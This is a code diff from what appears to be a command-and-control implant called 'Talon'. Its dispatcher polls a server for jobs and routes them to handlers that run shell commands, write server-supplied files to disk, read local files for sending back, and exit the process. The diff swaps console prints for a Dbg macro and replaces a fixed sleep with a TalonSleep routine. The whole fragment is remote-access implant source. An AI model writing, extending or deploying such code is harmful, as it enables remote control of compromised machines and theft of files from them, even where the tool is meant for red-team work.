@@ -21,14 +21,14 @@ VOID CommandDispatcher()
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand = 0;
 
-    puts( "Command Dispatcher..." );
+    Dbg("Command Dispatcher..." );
 
     do
     {
         if ( ! Instance.Session.Connected )
             return;
 
-        Sleep( Instance.Config.Sleeping * 1000 );
+        TalonSleep();
 
         Package = PackageCreate( COMMAND_GET_JOB );
 
@@ -37,7 +37,7 @@ VOID CommandDispatcher()
 
         if ( DataBuffer && DataSize > 0 )
         {
-            PRINT_HEX( DataBuffer, DataSize )
+            PRINT_HEX( DataBuffer, DataSize );
 
             ParserNew( &Parser, DataBuffer, DataSize );
             do
@@ -46,7 +46,7 @@ VOID CommandDispatcher()
 
                 if ( TaskCommand != COMMAND_NO_JOB )
                 {
-                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+                    Dbg("Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < TALON_COMMAND_LENGTH; FunctionCounter++ )
@@ -60,9 +60,9 @@ VOID CommandDispatcher()
                     }
 
                     if ( ! FoundCommand )
-                        puts( "Command not found !!" );
+                        Dbg("Command not found !!" );
 
-                } else puts( "Is COMMAND_NO_JOB" );
+                } else Dbg("Is COMMAND_NO_JOB" );
 
             } while ( Parser.Length > 4 );
 
@@ -75,7 +75,7 @@ VOID CommandDispatcher()
         }
         else
         {
-            puts( "Transport: Failed" );
+            Dbg("Transport: Failed" );
             break;
         }
 
@@ -86,7 +86,7 @@ VOID CommandDispatcher()
 
 VOID CommandShell( PPARSER Parser )
 {
-    puts( "Command::Shell" );
+    Dbg("Command::Shell" );
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -133,7 +133,7 @@ VOID CommandShell( PPARSER Parser )
 
 VOID CommandUpload( PPARSER Parser )
 {
-    puts( "Command::Upload" );
+    Dbg("Command::Upload" );
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -145,19 +145,19 @@ VOID CommandUpload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );
+    Dbg("FileName => %s (FileSize: %d)", FileName, FileSize );
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
     if ( hFile == INVALID_HANDLE_VALUE )
     {
-        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        Dbg("[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
     if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL ) )
     {
-        printf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
+        Dbg("[*] WriteFile: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
@@ -173,7 +173,7 @@ Cleanup:
 
 VOID CommandDownload( PPARSER Parser )
 {
-    puts( "Command::Download" );
+    Dbg("Command::Download" );
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -185,12 +185,12 @@ VOID CommandDownload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s", FileName );
+    Dbg("FileName => %s", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
-        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        Dbg("[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -199,7 +199,7 @@ VOID CommandDownload( PPARSER Parser )
 
     if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
     {
-        printf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
+        Dbg("[*] ReadFile: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -226,7 +226,7 @@ CleanupDownload:
 
 VOID CommandExit( PPARSER Parser )
 {
-    puts( "Command::Exit" );
+    Dbg("Command::Exit" );
 
     ExitProcess( 0 );
 }
